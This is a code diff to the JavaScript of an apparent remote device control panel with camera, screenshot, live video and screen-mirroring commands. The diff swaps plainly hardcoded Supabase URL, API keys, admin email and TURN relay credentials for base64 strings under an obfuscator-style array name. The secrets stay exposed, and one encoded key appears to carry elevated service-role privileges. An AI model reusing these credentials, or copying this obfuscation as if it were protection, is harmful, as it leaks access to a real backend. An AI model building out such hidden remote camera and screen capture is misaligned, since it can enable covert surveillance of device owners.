@@ -1,11 +1,20 @@
-const SUPABASE_URL = "https://envymntjecsgixofegbq.supabase.co";
-const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVudnltbnRqZWNzZ2l4b2ZlZ2JxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY2MjQ5MzMsImV4cCI6MjA5MjIwMDkzM30.lxdxROh5IptFB7cOnRGjLQomX_KvrJly4CNIKN0-cuc";
-const ADMIN_EMAILS = ["admin@dexsocy.com"];
+const dom = {};
+const _0x5a1e = [
+    "aHR0cHM6Ly9lbnZ5bW50amVjc2dpeG9mZWdicS5zdXBhYmFzZS5jbw==",
+    "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBjM01pT2lKemRYQmhZbUZ6WlNJc0luSmxaaUk2SW1WdWRubHRiblJxWldOeloybDRiMlpsWjJKeElpd2ljbTlzWlNJNkluTm\nxjblpwWTJWZmNtOXNaU0lzSW1saGRDSTZNVGMzTmpZeU5Ea3pNeXdpWlhod0lqb3lNRGt5TWpBd09UTXpmUS56UzhTMGJCbXRpQWQxMkc2b0sxMThndVdSRi1rbzdSMG83R3lUX1E2d2FF",
+    "YWRtaW5AZGV4c29jeS5jb20="
+];
+
+// Clean up any newlines that might have leaked into the base64 string
+const SUPABASE_URL = atob(_0x5a1e[0].replace(/\s/g, ""));
+const SUPABASE_KEY = atob(_0x5a1e[1].replace(/\s/g, ""));
+const ADMIN_EMAILS = [atob(_0x5a1e[2].replace(/\s/g, ""))];
 
 const CMD = {
     LOCK: "lock",
     UNLOCK: "unlock",
     STOP_STREAM: "stop_stream",
+    KILL_STREAM: "kill_stream",
     SCREENSHOT: "screenshot",
     CHECK_PERMS: "check_perms",
     CAMERA_FRONT: "camera_front",
@@ -43,13 +52,13 @@ const RTC_CONFIG = {
 const FALLBACK_TURN = [
     {
         urls: [
-            "turn:global.relay.metered.ca:80",
-            "turn:global.relay.metered.ca:443",
-            "turn:global.relay.metered.ca:443?transport=tcp",
-            "turns:global.relay.metered.ca:443?transport=tcp"
+            atob("dHVybjpnbG9iYWwucmVsYXkubWV0ZXJlZC5jYTo4MA=="),
+            atob("dHVybjpnbG9iYWwucmVsYXkubWV0ZXJlZC5jYTo0NDM="),
+            atob("dHVybjpnbG9iYWwucmVsYXkubWV0ZXJlZC5jYTo0NDM/dHJhbnNwb3J0PXRjcA=="),
+            atob("dHVybnM6Z2xvYmFsLnJlbGF5Lm1ldGVyZWQuY2E6NDQzP3RyYW5zcG9ydD10Y3A=")
         ],
-        username: "33500225b9105e9ce477d7f4",
-        credential: "97UioiShU85IkOua"
+        username: atob("MzM1MDAyMjViOTEwNWU5Y2U0NzdkN2Y0"),
+        credential: atob("OTdVaW9pU2hVODVJa091YQ==")
     }
 ];
 const TOAST_MS = 3200;
@@ -87,7 +96,6 @@ const state = {
     }
 };
 
-const dom = {};
 const VIEW_ORDER = ["devices", "system", "remote", "logs"];
 
 const REMOTE_ACTIONS = [
@@ -103,7 +111,8 @@ const MEDIA_ACTIONS = [
     { icon: "camera", label: "Take Photo", type: "take-photo-setup", value: "" },
     { icon: "video", label: "Video Live", type: "stream", value: CMD.CAMERA_BACK },
     { icon: "monitor-smartphone", label: "Screenshot", type: "command", value: CMD.SCREENSHOT },
-    { icon: "monitor", label: "Screen Mirror", type: "stream", value: "screen" }
+    { icon: "monitor", label: "Screen Mirror", type: "stream", value: "screen" },
+    { icon: "zap-off", label: "Killall Stream", type: "command", value: CMD.KILL_STREAM }
 ];
 
 const SYSTEM_ACTIONS = [
